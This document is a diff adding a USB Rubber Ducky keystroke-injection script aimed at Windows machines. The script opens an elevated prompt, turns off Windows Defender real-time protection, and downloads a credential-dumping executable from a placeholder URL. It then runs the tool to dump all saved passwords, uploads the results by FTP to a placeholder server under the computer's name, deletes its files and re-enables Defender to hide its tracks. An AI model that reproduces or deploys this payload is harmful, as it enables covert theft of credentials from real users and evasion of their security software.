@@ -1,0 +1,69 @@
+DELAY 2000
+CONTROL ESCAPE
+DELAY 1000
+STRING cmd
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT j
+ENTER
+DELAY 200
+STRING powershell Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 500
+STRING exit
+ENTER
+REM -------------open command prompt with admin privileges
+DELAY 300
+CONTROL ESCAPE
+DELAY 1000
+STRING cmd
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT j
+ENTER
+DELAY 300
+REM -------------download appropriate lazagne for architecture
+STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://YOURURL/ducky32.exe','c:\ducky.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('https://YOURURLducky64.exe','c:\ducky.exe');}
+ENTER
+DELAY 15000
+STRING c:\ducky.exe all -oN -output c:\
+ENTER
+DELAY 10000
+STRING powershell mv c:\cred
+TAB
+SPACE
+STRING c:\ducky.txt
+ENTER
+DELAY 100
+REM -------------sendfileviamail
+STRING powershell 
+ENTER
+DELAY 200
+REM ------------- sending emails does not work. so we will use ftp
+STRING $client = New-Object System.Net.WebClient
+ENTER
+DELAY 200
+STRING $client.Credentials = New-Object System.Net.NetworkCredential("FTPDATA", "PASSWORD")
+ENTER
+DELAY 200
+STRING $userName = (Get-WmiObject -Class Win32_ComputerSystem -Property Name).Name
+ENTER
+DELAY 200
+STRING $client.UploadFile("FTPURL/$($userName).txt", "C:\ducky.txt")
+ENTER
+DELAY 5000
+STRING exit
+ENTER
+REM -------------deleteFile
+STRING powershell rm c:\ducky.txt
+ENTER
+DELAY 100
+STRING powershell rm c:\ducky.exe
+ENTER
+DELAY 300
+STRING powershell Set-MpPreference -DisableRealtimeMonitoring $false
+ENTER
+STRING exit
+ENTER
